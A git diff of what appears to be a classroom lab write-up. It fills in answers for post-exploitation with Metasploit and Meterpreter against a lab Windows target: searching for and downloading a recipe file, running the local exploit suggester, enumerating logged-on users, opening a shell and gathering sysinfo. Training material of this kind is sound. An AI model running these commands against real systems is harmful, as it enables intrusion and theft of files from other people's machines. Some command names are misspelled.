@@ -21,6 +21,7 @@ You've been provided full access to the network and are getting ping responses f
 
     ### [Searchsploit Pictures](IMAGE/search.md)
 
+
 3. Now that we know which exploits are available to us, let's start Metasploit:
 
     * Run the command that starts Metasploit:
@@ -67,7 +68,7 @@ You've been provided full access to the network and are getting ping responses f
 
 7. You should now have a Meterpreter session open.
 
-    * Run the command to performs a search for the recipe.txt on the target:
+    * Run the command to perform a search for the recipe.txt on the target:
 
     ### Answer: **search -f * recipe * .txt**
 
@@ -77,11 +78,19 @@ You've been provided full access to the network and are getting ping responses f
 
     ### Answer: **download c/Users/IEUsers/Documents/Drinks.recipe.txt**
 
+
     ### [Exfiltrates command for recipe.txt](IMAGE/meta7.md) 
+
+    ### [Common Meterpreter Commands](IMAGE/meta8.md) 
 
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
+    * Run the command to use Meterpreters's local exploit suggester 
+
+    ### [Meterpreter Explit Suggester](IMAGE/meta9.md)  
+
+    ### Answer: **run post/multi/recon/local_explit_suggester
 
 Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
@@ -89,15 +98,22 @@ Bonus
 
 A. Run a Meterpreter post script that enumerates all logged on users.
 
-    Answer:
+### Answer: **run post/windows/gather/enum_logged_on_users** 
+
+### [View ALL logged on Users](IMAGE/meta10.md)  
+
 
 B. Open a Meterpreter shell.
 
-    Answer:
+### Answer: **shell** 
+
+### [Document the Shell Command](IMAGE/meta11.md) 
 
 C. Run the command that displays the target's computer system information:
 
-    Answer:
+### Answer: **sysinfo** 
+
+### [sysinfo information](IMAGE/meta12.md)
 
 
 
